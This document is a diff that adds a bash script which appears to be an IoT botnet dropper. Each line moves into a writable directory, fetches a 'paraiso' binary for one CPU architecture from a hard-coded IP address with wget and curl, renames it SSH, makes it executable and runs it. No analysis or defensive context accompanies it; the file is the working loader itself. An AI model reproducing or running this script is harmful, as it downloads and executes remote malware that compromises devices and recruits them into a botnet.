@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.x86; curl -O http://157.230.59.208/bins/paraiso.x86;cat paraiso.x86 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.mips; curl -O http://157.230.59.208/bins/paraiso.mips;cat paraiso.mips >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.mpsl; curl -O http://157.230.59.208/bins/paraiso.mpsl;cat paraiso.mpsl >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.arm; curl -O http://157.230.59.208/bins/paraiso.arm;cat paraiso.arm >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.arm5; curl -O http://157.230.59.208/bins/paraiso.arm5;cat paraiso.arm5 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.arm6; curl -O http://157.230.59.208/bins/paraiso.arm6;cat paraiso.arm6 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.arm7; curl -O http://157.230.59.208/bins/paraiso.arm7;cat paraiso.arm7 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.ppc; curl -O http://157.230.59.208/bins/paraiso.ppc;cat paraiso.ppc >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.m68k; curl -O http://157.230.59.208/bins/paraiso.m68k;cat paraiso.m68k >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.sh4; curl -O http://157.230.59.208/bins/paraiso.sh4;cat paraiso.sh4 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.59.208/bins/paraiso.spc; curl -O http://157.230.59.208/bins/paraiso.spc;cat paraiso.spc >SSH;chmod +x *;./SSH
